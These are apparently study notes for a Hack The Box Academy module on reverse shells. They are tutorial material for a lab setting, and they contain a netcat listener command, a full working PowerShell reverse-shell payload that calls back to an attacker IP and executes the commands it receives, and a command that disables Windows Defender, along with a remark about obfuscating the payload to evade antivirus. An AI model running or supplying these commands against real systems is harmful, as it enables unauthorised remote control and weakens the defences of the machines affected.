# Reverse Shells - [LINK](https://academy.hackthebox.com/app/module/115/section/1106)


## 1. What is a Reverse Shell?

In a **Reverse Shell**, the attacker sets up a listener on their machine, and the target system is forced to initiate an **outbound** connection back to the attacker.

| Feature | Description |
| --- | --- |
| **Connection Direction** | Target ➡️ connects to ➡️ Attacker |
| **Listener Location** | Running on the **Attack Box** (Your machine) |
| **Why it works better** | Most corporate firewalls block *inbound* connections (preventing Bind Shells) but allow *outbound* connections for normal web traffic. |
| **Best Practice** | Use common ports like **443 (HTTPS)** or **80 (HTTP)** for your listener. Firewalls rarely block these outbound ports. |

## 2. Step 1: Start the Listener (Attack Box)

You act as the server waiting for the target to connect. Use Netcat (`nc`) to listen on port 443.

* **Command:**
```bash
sudo nc -lvnp 443

```


*(Flags: `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p` port)*

## 3. Step 2: Deliver the Payload (Target Box)

Since Netcat is rarely installed natively on Windows, you should **"Live off the Land"** by using native tools like PowerShell to execute the reverse shell payload.

* **The PowerShell Reverse Shell Payload:**
*(Run this in the Windows Command Prompt. Make sure to replace `10.10.14.158` with your actual attack box IP).*
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```



## 4. Handling Antivirus (Windows Defender)

If you run the raw PowerShell payload on a modern Windows system, Windows Defender will likely block it with the following error:

> `This script contains malicious content and has been blocked by your antivirus software.`

* **How to disable AV (For Lab/Testing Purposes):**
Open an Administrative PowerShell console (Right-click -> Run as Administrator) and execute:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

```


* *Note for real-world engagements:* In the wild, you cannot simply ask the user to turn off their AV. You would need to obfuscate your PowerShell payload to bypass signature detection.
